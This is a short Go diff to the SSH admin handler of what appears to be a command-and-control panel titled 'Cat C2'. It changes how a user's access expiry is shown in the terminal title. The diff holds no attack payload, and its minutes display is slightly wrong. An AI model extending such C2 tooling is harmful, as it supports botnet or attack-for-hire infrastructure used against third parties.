@@ -5,7 +5,6 @@ import (
 	"github.com/gliderlabs/ssh"
 	"golang.org/x/crypto/ssh/terminal"
 	"math/rand"
-	"strconv"
 	"strings"
 	"time"
 )
@@ -32,15 +31,17 @@ func (this *Admin) Handle() {
 		for {
 			time.Sleep(time.Second)
 			var expiryString = ""
-			i, err := strconv.ParseInt("1645813852", 10, 64)
-			if err != nil {
-				expiryString = "Error"
+			var timee = time.Until(time.Unix(int64(userInfo.expiry), 0))
+			if userInfo.expiry != -1 {
+				if int64(timee.Hours()) == 0 {
+					expiryString = fmt.Sprintf("%dm", int64(timee.Minutes()))
+				} else {
+					expiryString = fmt.Sprintf("%dh %dm", int64(timee.Hours()), int64(timee.Minutes()))
+				}
 			} else {
-				var timee = time.Until(time.Unix(i, 0))
-				expiryString = fmt.Sprintf("%dh %dm", int64(timee.Hours()), int64(timee.Minutes()))
+				expiryString = "-1"
 			}
 			this.SetTitle("Cat C2 | User: [" + userInfo.username + "] | Expiry: [" + expiryString + "]")
-			i++
 		}
 	}()
 	this.conn.Write([]byte("\033[2J\033[1;1H"))
